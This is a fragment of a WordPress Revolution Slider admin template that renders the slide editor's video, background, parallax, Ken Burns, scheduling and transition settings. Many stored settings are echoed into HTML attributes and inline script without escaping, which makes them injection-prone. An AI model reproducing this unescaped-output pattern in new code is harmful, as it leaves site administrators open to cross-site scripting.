							<input type="text" value="<?php echo $video_end_at; ?>" name="video_end_at"> <?php _e('For Example: 02:17', REVSLIDER_TEXTDOMAIN); ?>
							<p style="clear: both;"></p>
						</p>
						<p>
							<label for="video_loop"><?php _e('Loop Video:', REVSLIDER_TEXTDOMAIN); ?></label>
							<select id="video_loop" name="video_loop" style="width: 200px;">
								<option <?php selected($video_loop, 'none');?> value="none"><?php _e('Disable', REVSLIDER_TEXTDOMAIN); ?></option>
								<option <?php selected($video_loop, 'loop');?> value="loop"><?php _e('Loop, Slide is paused', REVSLIDER_TEXTDOMAIN); ?></option>
								<option <?php selected($video_loop, 'loopandnoslidestop');?> value="loopandnoslidestop"><?php _e('Loop, Slide does not stop', REVSLIDER_TEXTDOMAIN); ?></option>
							</select>
						</p>
						
						<p>	
							<label for="video_nextslide"><?php _e('Next Slide On End:', REVSLIDER_TEXTDOMAIN); ?></label>
							<input type="checkbox" class="tp-moderncheckbox" id="video_nextslide" name="video_nextslide" data-unchecked="off" <?php checked($video_nextslide, 'on'); ?>>
						</p>
						<p>
							<label for="video_force_rewind"><?php _e('Rewind at Slide Start:', REVSLIDER_TEXTDOMAIN); ?></label>
							<input type="checkbox" class="tp-moderncheckbox" id="video_force_rewind" name="video_force_rewind" data-unchecked="off" <?php checked($video_force_rewind, 'on'); ?>>
						</p>
						
						<p>	
							<label for="video_mute"><?php _e('Mute Video:', REVSLIDER_TEXTDOMAIN); ?></label>
							<input type="checkbox" class="tp-moderncheckbox" id="video_mute" name="video_mute" data-unchecked="off" <?php checked($video_mute, 'on'); ?>>
						</p>
						
						<p class="vid-rev-vimeo-youtube video_volume_wrapper">
							<label for="video_volume"><?php _e('Video Volume:', REVSLIDER_TEXTDOMAIN); ?></label>
							<input type="text" id="video_volume" name="video_volume" <?php echo esc_attr($video_volume); ?>>
						</p>

						<span id="vid-rev-youtube-options">
							<p>
								<label for="video_speed"><?php _e('Video Speed:', REVSLIDER_TEXTDOMAIN); ?></label>
								<select id="video_speed" name="video_speed" style="width:75px">
									<option <?php selected($video_speed, '0.25');?> value="0.25"><?php _e('0.25', REVSLIDER_TEXTDOMAIN); ?></option>
									<option <?php selected($video_speed, '0.50');?> value="0.50"><?php _e('0.50', REVSLIDER_TEXTDOMAIN); ?></option>
									<option <?php selected($video_speed, '1');?> value="1"><?php _e('1', REVSLIDER_TEXTDOMAIN); ?></option>
									<option <?php selected($video_speed, '1.5');?> value="1.5"><?php _e('1.5', REVSLIDER_TEXTDOMAIN); ?></option>
									<option <?php selected($video_speed, '2');?> value="2"><?php _e('2', REVSLIDER_TEXTDOMAIN); ?></option>
								</select>
							</p>
							<p>
								<label><?php _e('Arguments YouTube:', REVSLIDER_TEXTDOMAIN); ?></label>
								<input type="text" id="video_arguments" style="width:350px;" value="<?php echo esc_attr($video_arguments); ?>">
							</p>
						</span>
						<p id="vid-rev-vimeo-options">
							<label><?php _e('Arguments Vimeo:', REVSLIDER_TEXTDOMAIN); ?></label>
							<input type="text" id="video_arguments_vim" style="width:350px;" value="<?php echo esc_attr($video_arguments_vim); ?>">
						</p>
					</span>
					
					<span id="bg-setting-wrap">
						<p>
							<label for="slide_bg_fit"><?php _e('Background Fit:', REVSLIDER_TEXTDOMAIN); ?></label>
							<select name="bg_fit" id="slide_bg_fit" style="margin-right:20px">
								<option value="cover"<?php selected($bgFit, 'cover'); ?>>cover</option>
								<option value="contain"<?php selected($bgFit, 'contain'); ?>>contain</option>
								<option value="percentage"<?php selected($bgFit, 'percentage'); ?>>(%, %)</option>
								<option value="normal"<?php selected($bgFit, 'normal'); ?>>normal</option>
							</select>
							<input type="text" name="bg_fit_x" style="min-width:54px;width:54px; <?php if($bgFit != 'percentage') echo 'display: none; '; ?> width:60px;margin-right:10px" value="<?php echo $bgFitX; ?>" />
							<input type="text" name="bg_fit_y" style="min-width:54px;width:54px;  <?php if($bgFit != 'percentage') echo 'display: none; '; ?> width:60px;margin-right:10px"  value="<?php echo $bgFitY; ?>" />
						</p>
						<p>
							<label for="slide_bg_position" id="bg-position-lbl"><?php _e('Background Position:', REVSLIDER_TEXTDOMAIN); ?></label>
							<span id="bg-start-position-wrapper">
								<select name="bg_position" id="slide_bg_position">
									<option value="center top"<?php selected($bgPosition, 'center top'); ?>>center top</option>
									<option value="center right"<?php selected($bgPosition, 'center right'); ?>>center right</option>
									<option value="center bottom"<?php selected($bgPosition, 'center bottom'); ?>>center bottom</option>
									<option value="center center"<?php selected($bgPosition, 'center center'); ?>>center center</option>
									<option value="left top"<?php selected($bgPosition, 'left top'); ?>>left top</option>
									<option value="left center"<?php selected($bgPosition, 'left center'); ?>>left center</option>
									<option value="left bottom"<?php selected($bgPosition, 'left bottom'); ?>>left bottom</option>
									<option value="right top"<?php selected($bgPosition, 'right top'); ?>>right top</option>
									<option value="right center"<?php selected($bgPosition, 'right center'); ?>>right center</option>
									<option value="right bottom"<?php selected($bgPosition, 'right bottom'); ?>>right bottom</option>
									<option value="percentage"<?php selected($bgPosition, 'percentage'); ?>>(x%, y%)</option>
								</select>
								<input type="text" name="bg_position_x" style="min-width:54px;width:54px; <?php if($bgPosition != 'percentage') echo 'display: none;'; ?>width:60px;margin-right:10px" value="<?php echo $bgPositionX; ?>" />
								<input type="text" name="bg_position_y" style="min-width:54px;width:54px; <?php if($bgPosition != 'percentage') echo 'display: none;'; ?>width:60px;margin-right:10px" value="<?php echo $bgPositionY; ?>" />
							</span>
						</p>

						<p>
							<label><?php _e("Background Repeat:",REVSLIDER_TEXTDOMAIN)?></label>
							<span>
								<select name="bg_repeat" id="slide_bg_repeat" style="margin-right:20px">
									<option value="no-repeat"<?php selected($bgRepeat, 'no-repeat'); ?>>no-repeat</option>
									<option value="repeat"<?php selected($bgRepeat, 'repeat'); ?>>repeat</option>
									<option value="repeat-x"<?php selected($bgRepeat, 'repeat-x'); ?>>repeat-x</option>
									<option value="repeat-y"<?php selected($bgRepeat, 'repeat-y'); ?>>repeat-y</option>
								</select>
							</span>
						</p>
					</span>
					
				</span>

				<span id="mainbg-sub-parallax" style="display:none">
					<p>
						<label><?php _e("Parallax Level:",REVSLIDER_TEXTDOMAIN); ?></label>
						<select name="slide_parallax_level" id="slide_parallax_level">
							<option value="-" <?php selected($slide_parallax_level, '-'); ?>><?php _e('No Parallax', REVSLIDER_TEXTDOMAIN); ?></option>
							<option value="1" <?php selected($slide_parallax_level, '1'); ?>>1</option>
							<option value="2" <?php selected($slide_parallax_level, '2'); ?>>2</option>
							<option value="3" <?php selected($slide_parallax_level, '3'); ?>>3</option>
							<option value="4" <?php selected($slide_parallax_level, '4'); ?>>4</option>
							<option value="5" <?php selected($slide_parallax_level, '5'); ?>>5</option>
							<option value="6" <?php selected($slide_parallax_level, '6'); ?>>6</option>
							<option value="7" <?php selected($slide_parallax_level, '7'); ?>>7</option>
							<option value="8" <?php selected($slide_parallax_level, '8'); ?>>8</option>
							<option value="9" <?php selected($slide_parallax_level, '9'); ?>>9</option>
							<option value="10" <?php selected($slide_parallax_level, '10'); ?>>10</option>
						</select>
					</p>
					<?php 
					if ($use_parallax=="off") {						
						echo '<i style="color:#c0392b">';
						_e("Parallax Feature in Slider Settings is deactivated, parallax will be ignored.",REVSLIDER_TEXTDOMAIN); 
						echo '</i>';
					}
					?>
				</span>

				<span id="mainbg-sub-kenburns" style="display:none">
					<p>
						<label><?php _e('Ken Burns / Pan Zoom:', REVSLIDER_TEXTDOMAIN); ?></label>
						<input type="checkbox" class="tp-moderncheckbox withlabel" id="kenburn_effect" name="kenburn_effect" data-unchecked="off" <?php checked($kenburn_effect, 'on'); ?>>
					</p>
					<span id="kenburn_wrapper" <?php echo ($kenburn_effect == 'off') ? 'style="display: none;"' : ''; ?>>						
						<p>
							<label><?php _e('Scale: (in %):', REVSLIDER_TEXTDOMAIN); ?></label>
							<label style="min-width:40px"><?php _e('From', REVSLIDER_TEXTDOMAIN); ?></label>
							<input style="min-width:54px;width:54px" type="text" name="kb_start_fit" value="<?php echo intval($kb_start_fit); ?>" />
							<label style="min-width:20px"><?php _e('To', REVSLIDER_TEXTDOMAIN)?></label>
							<input style="min-width:54px;width:54px" type="text" name="kb_end_fit" value="<?php echo intval($kb_end_fit); ?>" />
						</p>
						
						<p>
							<label><?php _e('Horizontal Offsets:', REVSLIDER_TEXTDOMAIN)?></label>
							<label style="min-width:40px"><?php _e('From', REVSLIDER_TEXTDOMAIN); ?></label>							
							<input style="min-width:54px;width:54px" type="text" name="kb_start_offset_x" value="<?php echo $kbStartOffsetX; ?>" />
							<label style="min-width:20px"><?php _e('To', REVSLIDER_TEXTDOMAIN)?></label>
							<input style="min-width:54px;width:54px" type="text" name="kb_end_offset_x" value="<?php echo $kbEndOffsetX; ?>" />
							<span><i><?php _e('Use Negative and Positive Values to offset from the Center !', REVSLIDER_TEXTDOMAIN); ?></i></span>
						</p>

						<p>
							<label><?php _e('Vertical Offsets:', REVSLIDER_TEXTDOMAIN)?></label>		
							<label style="min-width:40px"><?php _e('From', REVSLIDER_TEXTDOMAIN); ?></label>												
							<input style="min-width:54px;width:54px" type="text" name="kb_start_offset_y" value="<?php echo $kbStartOffsetY; ?>" />
							<label style="min-width:20px"><?php _e('To', REVSLIDER_TEXTDOMAIN)?></label>
							<input style="min-width:54px;width:54px" type="text" name="kb_end_offset_y" value="<?php echo $kbEndOffsetY; ?>" />
							<span><i><?php _e('Use Negative and Positive Values to offset from the Center !', REVSLIDER_TEXTDOMAIN); ?></i></span>
						</p>
						
						<p>
							<label><?php _e('Rotation:', REVSLIDER_TEXTDOMAIN)?></label>		
							<label style="min-width:40px"><?php _e('From', REVSLIDER_TEXTDOMAIN); ?></label>												
							<input style="min-width:54px;width:54px" type="text" name="kb_start_rotate" value="<?php echo $kbStartRotate; ?>" />
							<label style="min-width:20px"><?php _e('To', REVSLIDER_TEXTDOMAIN)?></label>
							<input style="min-width:54px;width:54px" type="text" name="kb_end_rotate" value="<?php echo $kbEndRotate; ?>" />
						</p>
						
						<p>
							<label><?php _e('Easing:', REVSLIDER_TEXTDOMAIN); ?></label>
							<select name="kb_easing">
								<option <?php selected($kb_easing, 'Linear.easeNone'); ?> value="Linear.easeNone">Linear.easeNone</option>
								<option <?php selected($kb_easing, 'Power0.easeIn'); ?> value="Power0.easeIn">Power0.easeIn  (linear)</option>
								<option <?php selected($kb_easing, 'Power0.easeInOut'); ?> value="Power0.easeInOut">Power0.easeInOut  (linear)</option>
								<option <?php selected($kb_easing, 'Power0.easeOut'); ?> value="Power0.easeOut">Power0.easeOut  (linear)</option>
								<option <?php selected($kb_easing, 'Power1.easeIn'); ?> value="Power1.easeIn">Power1.easeIn</option>
								<option <?php selected($kb_easing, 'Power1.easeInOut'); ?> value="Power1.easeInOut">Power1.easeInOut</option>
								<option <?php selected($kb_easing, 'Power1.easeOut'); ?> value="Power1.easeOut">Power1.easeOut</option>
								<option <?php selected($kb_easing, 'Power2.easeIn'); ?> value="Power2.easeIn">Power2.easeIn</option>
								<option <?php selected($kb_easing, 'Power2.easeInOut'); ?> value="Power2.easeInOut">Power2.easeInOut</option>
								<option <?php selected($kb_easing, 'Power2.easeOut'); ?> value="Power2.easeOut">Power2.easeOut</option>
								<option <?php selected($kb_easing, 'Power3.easeIn'); ?> value="Power3.easeIn">Power3.easeIn</option>
								<option <?php selected($kb_easing, 'Power3.easeInOut'); ?> value="Power3.easeInOut">Power3.easeInOut</option>
								<option <?php selected($kb_easing, 'Power3.easeOut'); ?> value="Power3.easeOut">Power3.easeOut</option>
								<option <?php selected($kb_easing, 'Power4.easeIn'); ?> value="Power4.easeIn">Power4.easeIn</option>
								<option <?php selected($kb_easing, 'Power4.easeInOut'); ?> value="Power4.easeInOut">Power4.easeInOut</option>
								<option <?php selected($kb_easing, 'Power4.easeOut'); ?> value="Power4.easeOut">Power4.easeOut</option>
								<option <?php selected($kb_easing, 'Back.easeIn'); ?> value="Back.easeIn">Back.easeIn</option>
								<option <?php selected($kb_easing, 'Back.easeInOut'); ?> value="Back.easeInOut">Back.easeInOut</option>
								<option <?php selected($kb_easing, 'Back.easeOut'); ?> value="Back.easeOut">Back.easeOut</option>
								<option <?php selected($kb_easing, 'Bounce.easeIn'); ?> value="Bounce.easeIn">Bounce.easeIn</option>
								<option <?php selected($kb_easing, 'Bounce.easeInOut'); ?> value="Bounce.easeInOut">Bounce.easeInOut</option>
								<option <?php selected($kb_easing, 'Bounce.easeOut'); ?> value="Bounce.easeOut">Bounce.easeOut</option>
								<option <?php selected($kb_easing, 'Circ.easeIn'); ?> value="Circ.easeIn">Circ.easeIn</option>
								<option <?php selected($kb_easing, 'Circ.easeInOut'); ?> value="Circ.easeInOut">Circ.easeInOut</option>
								<option <?php selected($kb_easing, 'Circ.easeOut'); ?> value="Circ.easeOut">Circ.easeOut</option>
								<option <?php selected($kb_easing, 'Elastic.easeIn'); ?> value="Elastic.easeIn">Elastic.easeIn</option>
								<option <?php selected($kb_easing, 'Elastic.easeInOut'); ?> value="Elastic.easeInOut">Elastic.easeInOut</option>
								<option <?php selected($kb_easing, 'Elastic.easeOut'); ?> value="Elastic.easeOut">Elastic.easeOut</option>
								<option <?php selected($kb_easing, 'Expo.easeIn'); ?> value="Expo.easeIn">Expo.easeIn</option>
								<option <?php selected($kb_easing, 'Expo.easeInOut'); ?> value="Expo.easeInOut">Expo.easeInOut</option>
								<option <?php selected($kb_easing, 'Expo.easeOut'); ?> value="Expo.easeOut">Expo.easeOut</option>
								<option <?php selected($kb_easing, 'Sine.easeIn'); ?> value="Sine.easeIn">Sine.easeIn</option>
								<option <?php selected($kb_easing, 'Sine.easeInOut'); ?> value="Sine.easeInOut">Sine.easeInOut</option>
								<option <?php selected($kb_easing, 'Sine.easeOut'); ?> value="Sine.easeOut">Sine.easeOut</option>
								<option <?php selected($kb_easing, 'SlowMo.ease'); ?> value="SlowMo.ease">SlowMo.ease</option>
							</select>
						</p>
						<p>
							<label><?php _e('Duration (in ms):', REVSLIDER_TEXTDOMAIN)?></label>
							<input type="text" name="kb_duration" value="<?php echo intval($kb_duration); ?>" />
						</p>
					</span>
				</span>
				
				<input type="hidden" id="image_url" name="image_url" value="<?php echo $imageUrl; ?>" />
				<input type="hidden" id="image_id" name="image_id" value="<?php echo $imageID; ?>" />
			</div>
			
			<div id="slide-general-settings-content" style="display:none">
				<!-- SLIDE TITLE -->
				<p style="display:none">
					<?php $title = RevSliderFunctions::getVal($slideParams, 'title','Slide'); ?>
					<label><?php _e("Slide Title",REVSLIDER_TEXTDOMAIN); ?></label>
					<input type="text" class="medium" id="title" disabled="disabled" name="title" value="<?php echo $title; ?>">
					<span class="description"><?php _e("The title of the slide, will be shown in the slides list.",REVSLIDER_TEXTDOMAIN); ?></span>
				</p>

				<!-- SLIDE DELAY -->
				<p>
					<?php $delay = RevSliderFunctions::getVal($slideParams, 'delay',''); ?>
					<label><?php _e('Slide "Delay":',REVSLIDER_TEXTDOMAIN); ?></label>
					<input type="text" class="small-text" id="delay" name="delay" value="<?php echo $delay; ?>">
					<span class="description"><?php _e("A new delay value for the Slide. If no delay defined per slide, the delay defined via Options (9000ms) will be used.",REVSLIDER_TEXTDOMAIN); ?></span>
				</p>

				<!-- SLIDE STATE --->
				<p>
					<?php $state = RevSliderFunctions::getVal($slideParams, 'state','published'); ?>
					<label><?php _e("Slide State",REVSLIDER_TEXTDOMAIN); ?></label>
					<select id="state" name="state">
						<option value="published"<?php selected($state, 'published'); ?>><?php _e("Published",REVSLIDER_TEXTDOMAIN); ?></option>
						<option value="unpublished"<?php selected($state, 'unpublished'); ?>><?php _e("Unpublished",REVSLIDER_TEXTDOMAIN); ?></option>
					</select>
					<span class="description"><?php _e("The state of the slide. The unpublished slide will be excluded from the slider.",REVSLIDER_TEXTDOMAIN); ?></span>
				</p>
				<!-- SLIDE LANGUAGE SELECTOR -->
				<?php
				if(isset($slider) && $slider->isInited()){
					$isWpmlExists = RevSliderWpml::isWpmlExists();
					$useWpml = $slider->getParam("use_wpml","off");

					if($isWpmlExists && $useWpml == "on"){
						$arrLangs = RevSliderWpml::getArrLanguages();
						$curset_lang = RevSliderFunctions::getVal($slideParams, "lang","all");
						?>
						<p>
							<label><?php _e("Language",REVSLIDER_TEXTDOMAIN); ?></label>
							<select name="lang">
								<?php
								if(!empty($arrLangs) && is_array($arrLangs)){
									foreach($arrLangs as $lang_handle => $lang_name){
										$sel = ($lang_handle === $curset_lang) ? ' selected="selected"' : '';
										echo '<option value="'.$lang_handle.'"'.$sel.'>'.$lang_name.'</option>';
									}
								}
								?>
							</select>
							<span class="description"><?php _e("The language of the slide (uses WPML plugin).",REVSLIDER_TEXTDOMAIN); ?></span>
						</p>
						<?php
					}
				}
				?>
				<!-- SLIDE VISIBLE FROM -->
				<p>
					<?php $date_from = RevSliderFunctions::getVal($slideParams, 'date_from',''); ?>
					<label><?php _e("Visible from:",REVSLIDER_TEXTDOMAIN); ?></label>
					<input type="text" class="inputDatePicker" id="date_from" name="date_from" value="<?php echo $date_from; ?>">
					<span class="description"><?php _e("If set, slide will be visible after the date is reached.",REVSLIDER_TEXTDOMAIN); ?></span>
				</p>

				<!-- SLIDE VISIBLE UNTIL -->
				<p>
					<?php $date_to = RevSliderFunctions::getVal($slideParams, 'date_to',''); ?>
					<label><?php _e("Visible until:",REVSLIDER_TEXTDOMAIN); ?></label>
					<input type="text" class="inputDatePicker" id="date_to" name="date_to" value="<?php echo $date_to; ?>">
					<span class="description"><?php _e("If set, slide will be visible till the date is reached.",REVSLIDER_TEXTDOMAIN); ?></span>
				</p>

				<!-- THUMBNAIL SETTINGS -->
				<div>
					<?php $slide_thumb = RevSliderFunctions::getVal($slideParams, 'slide_thumb',''); ?>
					<span style="display:inline-block; vertical-align: top;">
						<label><?php _e("Thumbnail:",REVSLIDER_TEXTDOMAIN); ?></label>
					</span>
					<div style="display:inline-block; vertical-align: top;">
						<div id="slide_thumb_button_preview" class="setting-image-preview"><?php
						if(intval($slide_thumb) > 0){
							?>
							<div style="width:100px;height:70px;background:url('<?php echo admin_url( 'admin-ajax.php' ); ?>?action=revslider_show_image&amp;img=<?php echo $slide_thumb; ?>&amp;w=100&amp;h=70&amp;t=exact'); background-position:center center; background-size:cover;"></div>
							<?php
						}elseif($slide_thumb !== ''){
							?>
							<div style="width:100px;height:70px;background:url('<?php echo $slide_thumb; ?>'); background-position:center center; background-size:cover;"></div>
							<?php
						}
						?></div>
						<input type="hidden" id="slide_thumb" name="slide_thumb" value="<?php echo $slide_thumb; ?>">
						<span style="clear:both;display:block"></span>
						<input type="button" id="slide_thumb_button" style="width:110px !important; display:inline-block;" class="button-image-select button-primary revblue" value="Choose Image" original-title="">
						<input type="button" id="slide_thumb_button_remove" style="margin-right:20px !important; width:85px !important; display:inline-block;" class="button-image-remove button-primary revred"  value="Remove" original-title="">
						<span class="description"><?php _e("Slide Thumbnail. If not set - it will be taken from the slide image.",REVSLIDER_TEXTDOMAIN); ?></span>
					</div>
				</div>
				<?php $thumb_dimension = RevSliderFunctions::getVal($slideParams, 'thumb_dimension', 'slider'); ?>
				<p>
					<span style="display:inline-block; vertical-align: top;">
						<label><?php _e("Thumbnail Dimensions:",REVSLIDER_TEXTDOMAIN); ?></label>
					</span>
					<select name="thumb_dimension">
						<option value="slider" <?php selected($thumb_dimension, 'slider'); ?>><?php _e('From Slider Settings', REVSLIDER_TEXTDOMAIN); ?></option>
						<option value="orig" <?php selected($thumb_dimension, 'orig'); ?>><?php _e('Original Size', REVSLIDER_TEXTDOMAIN); ?></option>
					</select>
					<span class="description"><?php _e("Width and height of thumbnails can be changed in the Slider Settings -> Navigation -> Thumbs tab.",REVSLIDER_TEXTDOMAIN); ?></span>
				</p>
				<!-- SLIDE VISIBLE FROM -->
				<p style="display:none">
					<?php $save_performance = RevSliderFunctions::getVal($slideParams, 'save_performance','off'); ?>
					<label><?php _e("Save Performance:",REVSLIDER_TEXTDOMAIN); ?></label>
					<span style="display:inline-block; width:200px; margin-right:20px;">
						<input type="checkbox" class="tp-moderncheckbox withlabel" id="save_performance" name="save_performance" data-unchecked="off" <?php checked( $save_performance, "on" ); ?>>
					</span>
					<span class="description"><?php _e("Slide End Transition will first start when last Layer has been removed.",REVSLIDER_TEXTDOMAIN); ?></span>
				</p>

			</div>

			<!-- SLIDE ANIMATIONS -->
			<div id="slide-animation-settings-content" style="display:none">

				<!-- ANIMATION / TRANSITION -->
				<div id="slide_transition_row">
					<?php
						$slide_transition = RevSliderFunctions::getVal($slideParams, 'slide_transition','fade');
						if(!is_array($slide_transition))
							$slide_transition = explode(',', $slide_transition);
						
						if(!is_array($slide_transition)) $slide_transition = array($slide_transition);
						$transitions = $operations->getArrTransition();
					?>
					<?php $slot_amount = (array) RevSliderFunctions::getVal($slideParams, 'slot_amount','default'); ?>
					<?php $transition_rotation = (array) RevSliderFunctions::getVal($slideParams, 'transition_rotation','0'); ?>
					<?php $transition_duration = (array) RevSliderFunctions::getVal($slideParams, 'transition_duration','default'); ?>
					<?php $transition_ease_in = (array) RevSliderFunctions::getVal($slideParams, 'transition_ease_in','default'); ?>
					<?php $transition_ease_out = (array) RevSliderFunctions::getVal($slideParams, 'transition_ease_out','default'); ?>
					<script type="text/javascript">
						var choosen_slide_transition = [];
						<?php
						$tr_count = count($slide_transition);
						foreach($slide_transition as $tr){
							echo 'choosen_slide_transition.push("'.$tr.'");'."\n";
						}
						?>
						var transition_settings = {
							'slot': [],
							'rotation': [],
							'duration': [],
							'ease_in': [],
							'ease_out': []
							};
						<?php
						foreach($slot_amount as $sa){
							echo 'transition_settings["slot"].push("'.$sa.'");'."\n";
						}
						$sac = count($slot_amount);
						if($sac < $tr_count){
							while($sac < $tr_count){
								$sac++;
								echo 'transition_settings["slot"].push("'.$slot_amount[0].'");'."\n";
							}
						}
						
						foreach($transition_rotation as $sa){
							echo 'transition_settings["rotation"].push("'.$sa.'");'."\n";
						}
						$sac = count($transition_rotation);
						if($sac < $tr_count){
							while($sac < $tr_count){
								$sac++;
								echo 'transition_settings["rotation"].push("'.$transition_rotation[0].'");'."\n";
							}
						}
						
						foreach($transition_duration as $sa){
							echo 'transition_settings["duration"].push("'.$sa.'");'."\n";
						}
						$sac = count($transition_duration);
						if($sac < $tr_count){
							while($sac < $tr_count){
								$sac++;
								echo 'transition_settings["duration"].push("'.$transition_duration[0].'");'."\n";
							}
						}
						
						foreach($transition_ease_in as $sa){
							echo 'transition_settings["ease_in"].push("'.$sa.'");'."\n";
						}
						$sac = count($transition_ease_in);
						if($sac < $tr_count){
							while($sac < $tr_count){
								$sac++;
								echo 'transition_settings["ease_in"].push("'.$transition_ease_in[0].'");'."\n";
							}
						}
						
						foreach($transition_ease_out as $sa){
							echo 'transition_settings["ease_out"].push("'.$sa.'");'."\n";
						}
						$sac = count($transition_ease_out);
						if($sac < $tr_count){
							while($sac < $tr_count){
								$sac++;
								echo 'transition_settings["ease_out"].push("'.$transition_ease_out[0].'");'."\n";
							}
						}
						
						?>
					</script>
					<div id="slide_transition"  multiple="" size="1" style="z-index: 100;">
						<?php
						if(!empty($transitions) && is_array($transitions)){
							$counter = 0;
							$optgroupexist = false;
							$transmenu = '<ul class="slide-trans-menu">';
							$lastclass = '';
							$transchecks ='';
							$listoftrans = '<div class="slide-trans-lists">';
							
							foreach($transitions as $tran_handle => $tran_name){

								$sel = (in_array($tran_handle, $slide_transition)) ? ' checked="checked"' : '';

								if (strpos($tran_handle, 'notselectable') !== false) {
									$listoftrans = $listoftrans.$transchecks;
									$lastclass = "slide-trans-".$tran_handle;
									$transmenu = $transmenu.'<li class="slide-trans-menu-element" data-reference="'.$lastclass.'">'.$tran_name.'</li>';
									$transchecks ='';		

								}
								else
									$transchecks = $transchecks.'<div class="slide-trans-checkelement '.$lastclass.'"><input name="slide_transition[]" type="checkbox" data-useval="true" value="'.$tran_handle.'"'.$sel.'>'.$tran_name.'</div>';							
							}

							$listoftrans = $listoftrans.$transchecks;
							$transmenu = $transmenu."</ul>";
							$listoftrans = $listoftrans."</div>";
							echo $transmenu;
							echo $listoftrans;							
						}
						?>
						
						<div class="slide-trans-example">
							<div class="slide-trans-example-inner">
								<div class="oldslotholder" style="overflow:hidden;width:100%;height:100%;position:absolute;top:0px;left:0px;z-index:1">
									<div class="tp-bgimg defaultimg"></div>
								</div>
								<div class="slotholder" style="overflow:hidden;width:100%;height:100%;position:absolute;top:0px;left:0px;z-index:1">
									<div class="tp-bgimg defaultimg"></div>
								</div>
							</div>
						</div>
						<div class="slide-trans-cur-selected">
							<p><?php _e("Used Transitions (Order in Loops)",REVSLIDER_TEXTDOMAIN); ?></p>
							<ul class="slide-trans-cur-ul">
							</ul>
						</div>
						<div class="slide-trans-cur-selected-settings">
							<!-- SLOT AMOUNT -->
							
							<label><?php _e("Slot / Box Amount:",REVSLIDER_TEXTDOMAIN); ?></label>
							<input type="text" class="small-text input-deepselects" id="slot_amount" name="slot_amount" value="<?php echo $slot_amount[0]; ?>" data-selects="1||Random||Custom||Default" data-svalues ="1||random||3||default" data-icons="thumbs-up||shuffle||wrench||key">
							<span class="tp-clearfix"></span>
							<span class="description"><?php _e("# of slots/boxes the slide is divided into.",REVSLIDER_TEXTDOMAIN); ?></span>					
							<span class="tp-clearfix"></span>
							
							<!-- ROTATION -->
							
							<label><?php _e("Slot Rotation:",REVSLIDER_TEXTDOMAIN); ?></label>
							<input type="text" class="small-text input-deepselects" id="transition_rotation" name="transition_rotation" value="<?php echo $transition_rotation[0]; ?>" data-selects="0||Random||Custom||Default||45||90||180||270||360" data-svalues ="0||random||-75||default||45||90||180||270||360" data-icons="thumbs-up||shuffle||wrench||key||star-empty||star-empty||star-empty||star-empty||star-empty">
							<span class="tp-clearfix"></span>
							<span class="description"><?php _e("Start Rotation of Transition (deg).",REVSLIDER_TEXTDOMAIN); ?></span>
							<span class="tp-clearfix"></span>

							<!-- DURATION -->
							
							<label><?php _e("Animation Duration:",REVSLIDER_TEXTDOMAIN); ?></label>
							<input type="text" class="small-text input-deepselects" id="transition_duration" name="transition_duration" value="<?php echo $transition_duration[0]; ?>" data-selects="300||Random||Custom||Default" data-svalues ="500||random||650||default" data-icons="thumbs-up||shuffle||wrench||key">
							<span class="tp-clearfix"></span>
							<span class="description"><?php _e("The duration of the transition.",REVSLIDER_TEXTDOMAIN); ?></span>
							<span class="tp-clearfix"></span>

							<!-- IN EASE -->
							
							<label><?php _e("Easing In:",REVSLIDER_TEXTDOMAIN); ?></label>
							<select name="transition_ease_in">
									<option value="default">Default</option>
									<option value="Linear.easeNone">Linear.easeNone</option>
									<option value="Power0.easeIn">Power0.easeIn  (linear)</option>
									<option value="Power0.easeInOut">Power0.easeInOut  (linear)</option>
									<option value="Power0.easeOut">Power0.easeOut  (linear)</option>
									<option value="Power1.easeIn">Power1.easeIn</option>
									<option value="Power1.easeInOut">Power1.easeInOut</option>
									<option value="Power1.easeOut">Power1.easeOut</option>
									<option value="Power2.easeIn">Power2.easeIn</option>
									<option value="Power2.easeInOut">Power2.easeInOut</option>
									<option value="Power2.easeOut">Power2.easeOut</option>
									<option value="Power3.easeIn">Power3.easeIn</option>
									<option value="Power3.easeInOut">Power3.easeInOut</option>
									<option value="Power3.easeOut">Power3.easeOut</option>
									<option value="Power4.easeIn">Power4.easeIn</option>
									<option value="Power4.easeInOut">Power4.easeInOut</option>
									<option value="Power4.easeOut">Power4.easeOut</option>
									<option value="Back.easeIn">Back.easeIn</option>
									<option value="Back.easeInOut">Back.easeInOut</option>
									<option value="Back.easeOut">Back.easeOut</option>
									<option value="Bounce.easeIn">Bounce.easeIn</option>
									<option value="Bounce.easeInOut">Bounce.easeInOut</option>
									<option value="Bounce.easeOut">Bounce.easeOut</option>
									<option value="Circ.easeIn">Circ.easeIn</option>
									<option value="Circ.easeInOut">Circ.easeInOut</option>
									<option value="Circ.easeOut">Circ.easeOut</option>
									<option value="Elastic.easeIn">Elastic.easeIn</option>
									<option value="Elastic.easeInOut">Elastic.easeInOut</option>
									<option value="Elastic.easeOut">Elastic.easeOut</option>
									<option value="Expo.easeIn">Expo.easeIn</option>
									<option value="Expo.easeInOut">Expo.easeInOut</option>
									<option value="Expo.easeOut">Expo.easeOut</option>
									<option value="Sine.easeIn">Sine.easeIn</option>
									<option value="Sine.easeInOut">Sine.easeInOut</option>
									<option value="Sine.easeOut">Sine.easeOut</option>
									<option value="SlowMo.ease">SlowMo.ease</option>
							</select>
							<span class="tp-clearfix"></span>
							<span class="description"><?php _e("The easing of Appearing transition.",REVSLIDER_TEXTDOMAIN); ?></span>
							<span class="tp-clearfix"></span>

							<!-- OUT EASE -->
							
							<label><?php _e("Easing Out:",REVSLIDER_TEXTDOMAIN); ?></label>
							<select name="transition_ease_out">
									<option value="default">Default</option>
									<option value="Linear.easeNone">Linear.easeNone</option>
									<option value="Power0.easeIn">Power0.easeIn  (linear)</option>
									<option value="Power0.easeInOut">Power0.easeInOut  (linear)</option>
									<option value="Power0.easeOut">Power0.easeOut  (linear)</option>
									<option value="Power1.easeIn">Power1.easeIn</option>
									<option value="Power1.easeInOut">Power1.easeInOut</option>
									<option value="Power1.easeOut">Power1.easeOut</option>
									<option value="Power2.easeIn">Power2.easeIn</option>
									<option value="Power2.easeInOut">Power2.easeInOut</option>
									<option value="Power2.easeOut">Power2.easeOut</option>
									<option value="Power3.easeIn">Power3.easeIn</option>
									<option value="Power3.easeInOut">Power3.easeInOut</option>
									<option value="Power3.easeOut">Power3.easeOut</option>
									<option value="Power4.easeIn">Power4.easeIn</option>
									<option value="Power4.easeInOut">Power4.easeInOut</option>
									<option value="Power4.easeOut">Power4.easeOut</option>
									<option value="Back.easeIn">Back.easeIn</option>
									<option value="Back.easeInOut">Back.easeInOut</option>
